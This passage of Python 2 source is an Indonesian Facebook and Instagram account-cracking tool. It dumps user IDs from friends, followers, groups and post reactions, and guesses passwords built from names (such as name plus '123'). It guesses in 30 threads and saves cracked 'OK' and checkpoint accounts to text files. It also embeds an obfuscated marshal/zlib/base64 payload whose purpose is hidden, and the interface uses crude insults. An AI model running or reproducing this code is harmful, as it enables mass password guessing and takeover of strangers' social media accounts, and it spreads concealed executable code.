            elif ua in("my user agent","My User Agent","MY USER AGENT","My user agent"):
            	jalan("%s [!] \x1b[1;96m Anda akan di arahkan ke browser "%(H));jeda(2)
            	os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2);useragent()
            elif ua in("default","Default","DEFAULT"):
                ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
                open("data/ua.txt","w").write(ua_)
                print ("\n%s [√] \x1b[1;96mmenggunakan user agent bawaan"%(H));jeda(2);menu()
            open("data/ua.txt","w").write(ua);jeda(2)
            print ("\n%s [√] \x1b[1;92mberhasil mengganti user agent"%(H));jeda(2);menu()
        except KeyboardInterrupt as er:
			exit ("\x1b[1;91m [!] "+er) 
    elif u in("2","02"):
        try:
        	ua_ = open('data/ua.txt', 'r').read();jeda(2);print ("%s [%s*%s] user agent anda : %s%s"%(P,K,P,H,ua_));jeda(2);raw_input("\n%s [ %senter%s ] "%(P,K,P));menu()
        except IOError:
        	ua_ = '%s-'%(M)
    elif u in("0","00"):
    	menu()
    else:
        print("%s [!] \x1b[1;91mIsi yang benar kentod "%(M));jeda(2);uas()
# MENU INI AJG
def menu():
    os.system('clear')
    try:
    	romz = open('token.txt', 'r').read()
    except IOError:
        print ("%s [!] Token invalid "%(M));jeda(2);os.system('rm -rf token.txt');masuk()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+romz,headers=header)
        a = json.loads(r.text)
        nama = a["name"]
    except KeyError:
        print("%s [!] Token invalid "%(M));jeda(2);os.system('rm -rf data/token.txt && rm -rf data/cookies');masuk()
    except requests.exceptions.ConnectionError:
        exit("%s [!] Kesalahan koneksi "%(M))
    logo()
    print(" \x1b[1;92m[\x1b[1;93m•\x1b[1;92m] \x1b[1;97m--------------------------------------------")
    print ' \x1b[1;92m[\x1b[1;93m•\x1b[1;92m] \x1b[1;97mAuthor    : \x1b[1;92mSanz Tzy \x1b[1;93mX \x1b[1;92mHARIS GANZ \x1b[1;93mX \x1b[1;92mYumasaaTzy'
    print ' \x1b[1;92m[\x1b[1;93m•\x1b[1;92m] \x1b[1;97mVersion   : \x1b[1;92m2.5'
    print ' \x1b[1;92m[\x1b[1;93m•\x1b[1;92m] \x1b[1;97mFacebook  : \x1b[1;92mBintang Tzy'
    print(" \x1b[1;92m[\x1b[1;93m•\x1b[1;92m] \x1b[1;97m--------------------------------------------")
    print ' \x1b[1;92m[\x1b[1;93m•\x1b[1;92m] \x1b[1;97mTeam \x1b[1;93m     : \x1b[1;92mCODE-TEAM 2021'
    print(" \x1b[1;92m[\x1b[1;93m•\x1b[1;92m] \x1b[1;97mStatus    \x1b[1;93m: %s\x1b[1;92mPremium Donkk%s"%(H,N))
    print(" \x1b[1;92m[\x1b[1;93m•\x1b[1;92m] \x1b[1;97m--------------------------------------------")
    print ('\n %s[ welcome %s%s%s ] \n'%(P,K,nama,P))
    print (' \x1b[1;93m[%s\x1b[1;97m\x1b[1;96m01%s\x1b[1;93m] \x1b[1;97mDump id \x1b[1;93mteman/public'%(K,P)) 
    print (' \x1b[1;93m[%s\x1b[1;97m\x1b[1;96m02%s\x1b[1;93m] \x1b[1;97mDump id \x1b[1;93mteman/followers'%(K,P)) 
    print (' \x1b[1;93m[%s\x1b[1;97m\x1b[1;96m03%s\x1b[1;93m] \x1b[1;97mDump id \x1b[1;93mteman/reaction post'%(K,P))
    print (' \x1b[1;93m[%s\x1b[1;97m\x1b[1;96m04%s\x1b[1;93m] \x1b[1;97mDump id \x1b[1;93mpencarian nama'%(K,P))
    print (' \x1b[1;93m[%s\x1b[1;97m\x1b[1;96m05%s\x1b[1;93m] \x1b[1;97mDump id \x1b[1;93mAnggota grup'%(K,P))
    print (' \x1b[1;93m[%s\x1b[1;97m\x1b[1;96m06%s\x1b[1;93m] \x1b[1;97mCrack cari nama \x1b[1;93m(\x1b[1;96minstagram\x1b[1;93m) '%(K,P))
    print (' \x1b[1;93m[%s\x1b[1;97m\x1b[1;96m07%s\x1b[1;93m] %sStart crack %s'%(K,P,H,P)) 
    print (' \x1b[1;93m[%s\x1b[1;97m\x1b[1;96m08%s\x1b[1;93m] \x1b[1;97mSetting \x1b[1;93mU/A \x1b[1;93m[\x1b[1;96mUser agent\x1b[1;93m]'%(K,P)) 
    print (' \x1b[1;93m[%s\x1b[1;97m\x1b[1;96m09%s\x1b[1;93m] \x1b[1;97mChek hasil crack \x1b[1;93m[\x1b[1;96mAccount Fb\x1b[1;93m]'%(K,P)) 
    print (' \x1b[1;93m[%s\x1b[1;97m\x1b[1;96m10%s\x1b[1;93m] \x1b[1;97mChek Opsi \x1b[1;93m[\x1b[1;96mHasil Crack\x1b[1;93m]'%(K,P)) 
    print (' \x1b[1;93m[%s\x1b[1;97m\x1b[1;96m11%s\x1b[1;93m] \x1b[1;97mGabung group \x1b[1;93m[\x1b[1;96mFacebook\x1b[1;93m]'%(K,P))
    print (' \x1b[1;93m[%s\x1b[1;97m\x1b[1;96m12%s\x1b[1;93m] \x1b[1;97mInfo script \x1b[1;93m[\x1b[1;96mAuthor\x1b[1;93m]'%(K,P))
    print (' \x1b[1;93m[%s\x1b[1;97m\x1b[1;96m13%s\x1b[1;93m] \x1b[1;97mMenu Crack \x1b[1;93m[\x1b[1;96mIgeh><\x1b[1;93m]'%(K,P))
    print (' \x1b[1;93m[%s\x1b[1;97m\x1b[1;96m00%s\x1b[1;93m] \x1b[1;91mHapus token '%(M,P))
    unik = raw_input('\n%s [?] Menu : %s'%(P,K))
    if unik == '':
        print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
    elif unik in['1','01']:
        publik(romz)
    elif unik in['2','02']:
        followers(romz)
    elif unik in['3','03']:
        postingan(romz)
    elif unik in['4','04']:
        dumpfl()
    elif unik in['5','05']:
        group(__romz__())
    elif unik in['6','06']:
    	igg()
    elif unik in['7','07']:
        ngentod().romiy()
    elif unik in['8','08']:
    	useragent()
    elif unik in['9','09']:
    	print "\n%s [01] Hasil crack akun facebook "%(P)
        print "%s [02] Hasil crack akun instagram "%(P)
        c = raw_input('\n%s [?] Menu : %s'%(P,K))
    	hasill(c)
    elif unik in['10','100']:
        file_cp()
    elif unik in['11','110']:
        os.system("xdg-open https://www.facebook.com/groups/924679595149360")
    elif unik in['12','120']:
        info_tools()
    elif unik in['13','130']:
    	menu_ig()
    elif unik in['0','00']:
        print ('')
        tik();jeda(1);os.system('rm -rf token.txt')
        jalan('\n%s [√] berhasil terhapus '%(H));exit()
    else:
        print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
# Yumasaa Ganss
def menu_ig():
	os.system("python2 yakuzaXsuzuran.py")
# pastikan taruh file ya yang sama directoryokh

def hasill(c):
	if c in[""]:
		print ("%s[%s!%s] isi yang benar kentod"%(P,M,P));exit()
	elif c in["1","01"]:
		try:
			dirs = os.listdir("hasil")
			print ("")
			for file in dirs:
				print("%s -> %s%s"%(K,P,file));jeda(0.2)
			print("\n %s[%s!%s] cth : CP-%s-%s-%s%s"%(P,M,P,ha,op,ta,".txt"))
			file = raw_input("%s [?] masukan file : "%(P));jeda(0.2)
			if file == "":
				print("%s [!] file tidak ada "%(M))
			total = open("hasil/%s"%(file)).read().splitlines()
			print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
			nm_file = ("%s"%(file)).replace("-", " ")
			jalan(" [%s*%s] total akun : %s"%(K,P,len(total)))
			print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
			for akun in total:
				fb = akun.replace("\n","")
				tling  = fb.replace(" *--> ", " *-->").replace(" *-->", " *--> ")
				print(tling);jeda(0.03)
			print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
			raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
		except (IOError):
			print("\n%s [!] tidak ada hasil "%(M))
			raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
	elif c in["2","02"]:
		print "\n%s [01] Hasil crack akun %sOK "%(P,H)
        print "%s [02] Hasil crack akun %sCP "%(P,K)
        while True:
        	rom = raw_input('\n%s [?] Menu : %s'%(P,K))
		if rom in['1','01']:
			try:
				oke = open("okeh.txt", "r").readlines()
				print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
				jalan(" [%s*%s] total akun : %s%s"%(K,P,H,str(len(oke))))
				print(" %s[%s*%s] --------------------------------------%s"%(P,K,P,H));jeda(2)
				okek = open("okeh.txt", "r").read()
				print (okek)
				exit(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
			except IOError,KeyError:
				exit (M+"\n [!] tidak ada hasil awokawokawok")
		elif rom in['2','02']:
			try:
				cepe = open("cepeh.txt", "r").readlines()
				print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
				jalan(" [%s*%s] total akun : %s%s"%(K,P,K,str(len(cepe))))
				print(" %s[%s*%s] --------------------------------------%s"%(P,K,P,K));jeda(2)
				cepek = open("cepeh.txt", "r").read()
				print (cepek)
				exit(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
			except IOError,KeyError:
				exit (M+"\n [!] tidak ada hasil awokawokawok")
		else:
			exit()
def igg():
	print ("\n%s [%s!%s] Cth nama %s: %sRomi "%(P,M,P,M,K))
	usr_ = raw_input('%s [?] Input nama > %s'%(P,K))
	jumlah = input('%s [?] Limit user > %s'%(P,K))
	bff_2 = usr_.replace(" ", "")
	cr.append("romi_afrizal")
	mi.append(bff_2+"|"+bff_2)
	mi.append(bff_2+"_"+"|"+bff_2)
	for _i_ in range(1, jumlah+1):
		mi.append(bff_2+str(_i_)+"|"+bff_2)
		mi.append(bff_2+"_"+str(_i_)+"|"+bff_2)
		mi.append(bff_2+str(_i_)+"_"+"|"+bff_2)
	print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s okeh.txt'%(P,K,P,H,P,H);jeda(0.2)
	print '%s [%s*%s] akun %sCP %stersimpan di > %scepeh.txt\n'%(P,K,P,K,P,K);jeda(0.2)
	with ThreadPoolExecutor(max_workers=30) as log:
		for ro in mi:
			try:
				_bff_ = []
				_r_ = ro.encode("utf-8")
				_o_ = _r_.split("|")[0]
				_m_ = _r_.split("|")[1]
				_i_ = _m_.split()
				if len(cr) != 1:
					if len(_o_) >= 6:
						_bff_.append(_o_)
						if len(_i_[0]) <= 2:
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_bff_.append(_m_)
						else:
							_bff_.append(_i_[0]+"123")
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_bff_.append(_m_)
					else:
						_bff_.append(_o_+_o_)
						if len(_i_[0]) <= 2:
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_bff_.append(_m_)
						else:
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							_bff_.append(_i_[0]+"123")
							if len(_m_) >= 6:
								_bff_.append(_m_)
				else:
					_bff_.append(_i_[0]+"123")
					_bff_.append(_i_[0]+"12345")
					_bff_.append(_o_)
				log.submit(crack2, _o_, _bff_)
			except: pass
	exit("%s• finished"%(H))
_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', 'eJx1Us1q20AQnrFkO3ZS00MI8c3QBkTBFr30UNo0aQ4NFHJIKC25CEW7lmXLWkU7QqQop/TUF0ifoA/WJ+nMOv2B0oX5kfabb2Z2JoGHgyxHLHaflQL4AnDJTgdQIVx2xLsYBB5fJqK6LD2WEwn5zurmGxDAEoHhLcAe4zME4kAPXtwh3nrQerD04I5ZfRirLoxvfWh9UD0Yxxuvz/+3+KsLLQcOYNWByoIaAvWEtGXCLsx92Ht3Wjx1mG2HuXeY/j8YgI9FHxCxQPjETV0EO1zqmX3CekFU2pdh2DTNLCssxWkVr2eJWYcHNnwTRfHr58zIOB0rXVk7ZP+D1dX0ONUFuSuOKBfXOfns13zF3QJkih6z0SrV0dzkuWm0iq5uSF4sMTWHbrH3VleL2Ga5K+XRgZ08m04PJ2x/3H/9y/w+JOlPFjpZlSYrKBAOR1Tp61pbsiRTSTXR9kMxUSx1fnbFLa0pHCBTqYsqdZFmq5pIxn7q9PtAKjyXFlwfZUMyYH4Yqjfsil1/Y6NAdsYpO2IVWpXElQqvDM3KTa9Zkc4N/tooQK8zwV0c4gh3cF+k46MnO8IDcXt1viupJcGZKbRLnpuSaf7k+m9C6enV2qg614cup9AMRj7+BEx1j/c=', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'enc_lam.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
      
if __name__ == '__main__':
    os.system('git pull')
    folder()
    menu()    
